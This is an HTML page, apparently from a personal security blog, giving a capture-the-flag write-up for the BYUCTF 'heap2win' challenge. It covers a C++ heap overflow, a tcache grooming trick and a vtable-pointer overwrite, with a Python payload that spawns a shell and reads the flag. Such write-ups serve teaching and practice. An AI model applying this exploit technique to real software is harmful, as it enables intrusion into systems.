@@ -1,0 +1,128 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="theme-color" content="#080706">
+  <meta name="description" content="A C++ button app with a 16-byte %s overflow and a never-reachable WinnerButton::push that calls system(&quot;/bin/sh&quot;). tcache reuse drops a Custom button right before a live Hype button, turning a forward-only overflow into a vtable-pointer overwrite. No leak, all constants.">
+  <meta property="og:type" content="article">
+  <meta property="og:site_name" content="0xAdham Field Notes">
+  <meta property="og:title" content="BYUCTF: heap2win · 0xAdham">
+  <meta property="og:description" content="A C++ button app with a 16-byte %s overflow and a never-reachable WinnerButton::push that calls system(&quot;/bin/sh&quot;). tcache reuse drops a Custom button right before a live Hype button, turning a forward-only overflow into a vtable-pointer overwrite. No leak, all constants.">
+  <meta name="twitter:card" content="summary_large_image">
+  <title>BYUCTF: heap2win · 0xAdham</title>
+  <link rel="icon" type="image/svg+xml" href="/assets/mark.svg">
+  <link rel="stylesheet" href="/assets/site.css">
+</head>
+<body>
+  <header class="site-header">
+    <div class="wrap header-inner">
+      <a class="brand" href="/" aria-label="0xAdham Field Notes home">
+        <svg class="brand-mark" viewBox="0 0 40 40" aria-hidden="true"><path d="M10 4H4v32h6M30 4h6v32h-6" fill="none" stroke="currentColor" stroke-width="3"/><rect x="12" y="17" width="7" height="7" fill="currentColor"/><rect x="22" y="17" width="7" height="7" fill="#ff3428"/></svg>
+        <span class="brand-name">0xADHAM</span><span class="brand-note">Field notes / security research</span>
+      </a>
+      <button class="menu-toggle" type="button" aria-expanded="false" aria-controls="primary-nav">[ Menu ]</button>
+      <nav class="nav-links" id="primary-nav" aria-label="Main navigation">
+        <a href="/">Home</a><a href="/writing/" aria-current="page">Writing</a><a href="/research/">Research</a><a href="/about/">About</a>
+      </nav>
+    </div>
+  </header>
+  <main>
+    <div class="wrap article-header">
+      <div class="eyebrow"><span class="index">FIELD NOTE</span> CTF</div>
+      <h1 class="page-title">BYUCTF: heap2win</h1>
+      <div class="article-byline">
+        <span>By Adham Mohammed / 0xAdham</span>
+        <span>2026-05-31</span>
+        <span>CTF</span>
+      </div>
+    </div>
+    <section class="section">
+      <div class="wrap content-layout">
+        <article class="prose">
+          <p><strong>Platform:</strong> BYUCTF<br />
+<strong>Challenge:</strong> heap2win<br />
+<strong>Category:</strong> Pwn<br />
+<strong>Difficulty:</strong> Medium</p>
+<h2>Flag</h2>
+<p><code>byuctf{y34h,..._you're_a_pro}</code></p>
+<h2>Target</h2>
+<p><code>&lt;remote-host&gt;:1364</code>. <code>heap2win</code> + <code>main.cpp</code> (source given).</p>
+<ul>
+<li>ELF 64-bit, <strong>non-PIE</strong> (EXEC), <strong>Full RELRO</strong>, <strong>no canary</strong>. C++ with virtual functions.</li>
+<li>A C++ "button" app: make <code>Hype</code>/<code>Custom</code>/<code>Winner</code> buttons, then "push" one (a virtual call).</li>
+</ul>
+<h2>Bugs (from source)</h2>
+<pre><code class="language-cpp">class WinnerButton : public Button {           // never reachable by menu (option 3 refuses)
+    void push() { cout&lt;&lt;&quot;WINNER...&quot;; system(&quot;/bin/sh&quot;); }
+};
+class CustomButton : public Button {
+    char name[0x10];
+    CustomButton(){ scanf(&quot;%s&quot;, name); }       // (1) HEAP OVERFLOW: %s into 16-byte buf
+};
+// pushButton: only checks choice &gt;= count+1  -&gt; (2) negative/zero index allowed
+button_list[choice-1]-&gt;push();                  // virtual call: fn = *(vptr+0x10)
+</code></pre>
+<p>The win primitive is <code>WinnerButton::push</code> → <code>system("/bin/sh")</code>. Goal: make a button's <strong>vptr</strong> point at the WinnerButton vtable so its <code>push()</code> lands in <code>system</code>.</p>
+<h2>Vtable math</h2>
+<ul>
+<li><code>nm</code>: vtable for WinnerButton @ <code>0x403630</code> → object <strong>vptr = 0x403640</strong>.</li>
+<li>The call site does <code>rdx = *vptr; rdx += 0x10; call *rdx</code> → <code>*(0x403640+0x10) = *(0x403650) = 0x401376 = WinnerButton::push</code>. ✓</li>
+<li>So writing <strong><code>0x403640</code></strong> into a victim button's first 8 bytes wins. Non-PIE ⇒ this address is constant.</li>
+</ul>
+<h2>Heap groom: the trick</h2>
+<p><code>HypeButton</code> (8 B), <code>CustomButton</code> (0x18 B) and the small <code>vector&lt;Button*&gt;</code> arrays are <strong>all 0x20 chunks</strong>. Each <code>push_back</code> that grows the vector frees the old array into tcache-0x20, and the next <code>new Button</code> reuses it (LIFO). gdb dump confirmed allocation order ≠ address order. Exploit the reuse so a <strong>Custom button lands immediately <em>before</em> a live Hype button</strong>, then overflow forward into that Hype's vptr:</p>
+<ol>
+<li>Make <strong>Hype</strong> (H0).</li>
+<li>Make <strong>Hype</strong> (H1), allocated fresh after H0.</li>
+<li>Make <strong>Custom</strong> (C). <code>new</code> reuses the freed array chunk that sits <strong>right before H1</strong>, i.e. <code>C</code> is adjacent and lower than <code>H1</code>.</li>
+<li><code>C</code>'s <code>scanf("%s")</code> overflows out of <code>name</code> into <code>H1</code>'s vptr.</li>
+</ol>
+<p>Chunk layout (per gdb): <code>C@P</code>, <code>name@P+8</code>, next chunk header at <code>P+0x10/0x18</code>, <code>H1</code> object (vptr) at <code>P+0x20</code>. Distance <code>name → H1.vptr = 0x18 = 24</code>.</p>
+<h2>Payload</h2>
+<p>Overwrite only the low 3 bytes; <code>scanf</code> appends the NUL (byte 3), and <code>H1</code>'s original vptr (<code>0x00403668</code>) already has zero high bytes:</p>
+<pre><code class="language-python">payload = b&quot;A&quot;*24 + b&quot;\x40\x36\x40&quot;     # 24 pad + 0x403640 (LE, low 3 bytes)
+# 0x40='@', 0x36='6' -&gt; no whitespace, scanf reads all 27 bytes then NUL-terminates
+</code></pre>
+<p>Drive sequence (menus): make Hype, make Hype, make Custom w/ payload, <strong>push button #2</strong> (= H1):</p>
+<pre><code class="language-python">snd(b&quot;1\n1\n&quot;); snd(b&quot;1\n1\n&quot;)
+snd(b&quot;1\n2\n&quot; + payload + b&quot;\n&quot;)
+snd(b&quot;2\n2\n&quot;)                # H1-&gt;push() now == WinnerButton::push -&gt; /bin/sh
+snd(b&quot;cat flag.txt\n&quot;)
+</code></pre>
+<p><code>&gt;&gt; WINNER WINNER WINNER</code> → shell → <code>byuctf{y34h,..._you're_a_pro}</code>.</p>
+<h2>Takeaways</h2>
+<ul>
+<li><strong>C++ vtable hijack:</strong> overwriting an object's vptr redirects every virtual call. With a <code>win</code> method in another class, point the victim vptr at that class's vtable and trigger the matching slot. Verify the slot offset from the call site (<code>*(vptr+0x10)</code> here).</li>
+<li><strong>tcache reuse drives adjacency.</strong> When victim objects and container backing-arrays share a size class, freed arrays let a later allocation slot in <em>before</em> an earlier object, turning a forward-only <code>%s</code> overflow into a victim-vptr overwrite. Confirm layout in gdb instead of guessing.</li>
+<li><strong>Partial overwrite avoids null-byte problems:</strong> write only the low bytes that differ; let <code>scanf</code>'s NUL terminator zero the next byte and rely on the original high bytes already being zero.</li>
+<li>The <code>pushButton</code> negative-index bug (<code>choice&lt;=0</code>) is a second, independent path (OOB <code>button_list[-k]</code>), but the overflow was the deterministic one.</li>
+<li>Non-PIE + a fixed <code>win</code> vtable means <strong>no leak needed</strong>. The whole exploit is constants + heap shaping.</li>
+</ul>
+<p><em>0xAdham</em></p>
+        </article>
+        <aside class="article-aside">
+          <div class="eyebrow"><span class="index">FIELD NOTE</span> Details</div>
+          <h2>Clear. Scoped. Reproducible.</h2>
+          <p>A C++ button app with a 16-byte %s overflow and a never-reachable WinnerButton::push that calls system(&quot;/bin/sh&quot;). tcache reuse drops a Custom button right before a live Hype button, turning a forward-only overflow into a vtable-pointer overwrite. No leak, all constants.</p>
+          <div style="margin: 20px 0; padding-top: 16px; border-top: 1px solid var(--line); font-size: 13px; font-family: var(--mono); color: var(--muted); line-height: 1.8;">
+            <div><strong style="color:var(--ink)">Published:</strong> 2026-05-31</div>
+            <div><strong style="color:var(--ink)">Category:</strong> CTF</div>
+            <div style="margin-top:10px"><strong style="color:var(--ink)">Tags:</strong><div style="margin-top:5px"><span class="tag" style="display:inline-block;margin:2px 4px 2px 0;padding:2px 7px;background:var(--panel-2);border:1px solid var(--line);border-radius:2px;font-size:11px">ctf</span><span class="tag" style="display:inline-block;margin:2px 4px 2px 0;padding:2px 7px;background:var(--panel-2);border:1px solid var(--line);border-radius:2px;font-size:11px">pwn</span><span class="tag" style="display:inline-block;margin:2px 4px 2px 0;padding:2px 7px;background:var(--panel-2);border:1px solid var(--line);border-radius:2px;font-size:11px">heap</span><span class="tag" style="display:inline-block;margin:2px 4px 2px 0;padding:2px 7px;background:var(--panel-2);border:1px solid var(--line);border-radius:2px;font-size:11px">c++</span><span class="tag" style="display:inline-block;margin:2px 4px 2px 0;padding:2px 7px;background:var(--panel-2);border:1px solid var(--line);border-radius:2px;font-size:11px">vtable-hijack</span><span class="tag" style="display:inline-block;margin:2px 4px 2px 0;padding:2px 7px;background:var(--panel-2);border:1px solid var(--line);border-radius:2px;font-size:11px">tcache</span><span class="tag" style="display:inline-block;margin:2px 4px 2px 0;padding:2px 7px;background:var(--panel-2);border:1px solid var(--line);border-radius:2px;font-size:11px">byuctf</span></div></div>
+          </div>
+          <a class="button" href="/writing/">Back to archive <span class="arrow" aria-hidden="true">←</span></a>
+        </aside>
+      </div>
+    </section>
+  </main>
+  <footer class="site-footer">
+    <div class="wrap">
+      <div class="footer-bottom">
+        <span>© 2026 · 0xAdham</span>
+        <a href="/writing/">Return to writing ↑</a>
+      </div>
+    </div>
+  </footer>
+  <script src="/assets/site.js" defer></script>
+</body>
+</html>
